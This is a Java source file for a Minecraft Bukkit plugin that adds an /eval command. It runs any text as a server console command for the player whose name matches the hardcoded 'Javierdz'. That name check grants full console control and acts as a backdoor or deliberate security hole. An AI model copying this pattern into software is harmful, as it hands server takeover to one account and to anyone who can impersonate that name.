package es.javierdz.survivalUtils.commands;


import es.javierdz.survivalUtils.util.ChatColor;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Eval implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage(ChatColor.getColor("&cEste comando solo puede ser ejecutado por un jugador"));
            return true;
        }
        if (!(sender.getName().equals("Javierdz"))) {
            sender.sendMessage(ChatColor.getColor("&cNo tienes permiso para ejecutar este comando"));
            return true;
        }
        
        if ( args.length == 0 ) {
            sender.sendMessage(ChatColor.getColor("&cUso /eval <comando>"));
            return true;
        }
        String comando = String.join(" ", args);
        if (comando.startsWith("/")) {
            comando = comando.substring(1);
        }

        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), comando);
        return true;
    }
}
